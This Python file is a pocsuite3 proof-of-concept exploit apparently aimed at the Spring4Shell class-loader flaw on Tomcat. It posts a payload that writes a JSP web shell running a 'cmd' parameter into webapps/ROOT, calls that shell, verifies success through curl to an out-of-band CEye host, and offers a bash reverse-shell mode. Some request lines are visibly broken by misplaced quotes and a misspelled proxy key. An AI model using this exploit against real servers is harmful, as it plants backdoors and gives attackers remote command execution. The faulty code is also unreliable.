#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
    CEye,
    get_listener_ip, get_listener_port, REVERSE_PAYLOAD
)

minimum_version_required('1.9.11')


class DemoPOC(POCBase):

    def _exploit(self, param=''):
        proxies = {
            'http':'http://127.0.0.1:7890',
            'htpps':'https://127.0.0.1:7890'
        }
        head = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'close',
            'suffix': '%>//',
            'c1': 'Runtime',
            'c2': '<%',
            'DNT': '1',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': '762',
        }
        data = 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22S%22.equals(request.getParameter(%22Tomcat%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=Shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='

        try:
            res = requests.post(self.url,headers=head,data=data,proxies=proxies,verify=False)
            get_url = requests.get(self.url+"/Shell.jsp',headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0'},verify=False")
            if get_url.status_code == 200:
                get_result = requests.get(self.url+f"/Shell.jsp?Tomcat=S&cmd={param}',headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0'},verify=False")
                return get_result.text
        except requests.exceptions.ConnectionError as e:
            print(e)

    def _verify(self):
        result = {}
        oob = CEye()
        v = oob.build_request(value='')
        url, flag = v['url'], v['flag']
        param = f'curl {url}'
        res = self._exploit(param)
        if oob.verify_request(flag):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo'][param] = res
        return self.parse_output(result)

    def _attack(self):
        result = {}
        param = self.get_option('cmd')
        res = self._exploit(param)
        result['VerifyInfo'] = {}
        result['VerifyInfo']['URL'] = self.url
        result['VerifyInfo'][param] = res
        return self.parse_output(result)

    def _shell(self):
        try:
            self._exploit(REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port()))
        except Exception:
            pass


register_poc(DemoPOC)
